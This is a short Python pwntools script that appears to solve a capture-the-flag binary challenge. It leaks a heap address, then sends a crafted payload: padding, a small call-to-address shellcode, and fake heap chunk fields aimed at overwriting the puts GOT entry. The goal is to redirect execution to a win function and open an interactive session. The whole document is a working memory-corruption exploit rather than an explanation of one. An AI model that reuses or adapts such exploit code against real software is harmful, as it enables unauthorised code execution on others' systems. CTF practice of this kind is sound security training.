#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

context.terminal = ['tmux', 'new-window']

win = elf.symbols['win']
exit_got = elf.got['exit']
puts_got = elf.got['puts']

gdb.attach(p, 'b *main+189\n')

first_addr = int(p.recv().split('\n')[1].strip('\n'))

log.info('win: ' + hex(win))
log.info('exit@got: ' + hex(exit_got))
log.info('puts@got: ' + hex(puts_got))
log.info('first: ' + hex(first_addr))

p.sendline('A'*8 + "\xB8\x36\x89\x04\x08\xFF\xD0" + 'A'*649 + p32(0xfffffffc)*2 + p32(puts_got-0xc) + p32(first_addr+8) + p32(first_addr+8))

p.recv()
p.sendline('AAAA')

p.interactive()
